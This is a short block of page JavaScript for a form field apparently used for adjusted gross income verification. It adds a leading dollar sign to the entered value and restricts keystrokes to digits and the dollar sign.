    <script>
        document.getElementById('verification_agi').addEventListener('input', () => {
            const input = document.getElementById('verification_agi');
            const inputValue = input.value;

            // Check if the input has a value and if the first character is not a dollar sign
            if (inputValue && inputValue[0] !== '$') {
                // Add the dollar sign to the beginning of the input value
                input.value = '$' + inputValue;
            }
        })

        function onlyAllowNumbers(event) {
            // Get the key code of the pressed key
            const keyCode = event.which || event.keyCode;

            // Allow numbers (digits) and the dollar sign
            if ((keyCode >= 48 && keyCode <= 57) || keyCode === 36) {
                return true;
            }

            // Prevent any other characters from being typed
            event.preventDefault();
            return false;
        }
    </script>

